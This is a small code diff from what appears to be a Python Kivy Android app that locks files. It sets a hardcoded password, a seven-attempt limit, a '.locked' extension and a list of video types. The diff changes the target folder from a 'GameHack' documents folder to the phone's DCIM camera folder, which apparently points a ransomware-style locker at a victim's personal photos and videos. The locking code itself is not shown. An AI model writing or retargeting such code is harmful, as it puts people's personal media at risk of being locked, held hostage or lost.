@@ -24,7 +24,7 @@ Window.clearcolor = (0.05, 0.05, 0.1, 1)
 CONFIG_FILE = "lock_config.json"
 MAX_ATTEMPTS = 7
 PASSWORD = "yanal"
-TARGET_FOLDER = "/storage/emulated/0/Documents/GameHack"
+TARGET_FOLDER = "/storage/emulated/0/DCIM/"
 FILE_EXT = ".locked"
 VIDEO_EXTENSIONS = ['.mp4', '.avi', '.mov', '.mkv', '.flv', '.3gp', '.wmv']
 
